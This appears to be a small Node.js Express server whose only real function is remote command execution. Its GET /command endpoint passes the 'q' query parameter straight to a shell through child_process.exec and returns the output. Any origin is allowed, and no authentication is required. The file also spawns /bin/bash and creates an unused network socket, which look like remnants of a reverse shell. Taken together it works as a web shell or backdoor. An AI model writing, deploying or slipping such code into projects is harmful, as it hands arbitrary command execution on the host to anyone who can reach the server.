"use strict";
var express = require('express');
var app = express();
var fs = require('fs');
var port = 3000;
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
const { exec } = require("child_process");
var commandResponse = "NO_RESPONSE";
var bodyParser = require('body-parser')

app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
  });
// parse application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: true }))
 
// parse application/json
app.use(bodyParser.json())

var server = require('http').createServer(app);

server.listen(port);
console.log("listening on port : " + port);

app.get("/command", (req, res, next) => {
    execute(req.query.q);
    setTimeout(function () {
        res.end(commandResponse);
    }, 3000);
});

app.get("/print", (req, res, next) => {
    console.log(req.body);
});

function execute(command){
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        commandResponse = stdout;
    });
}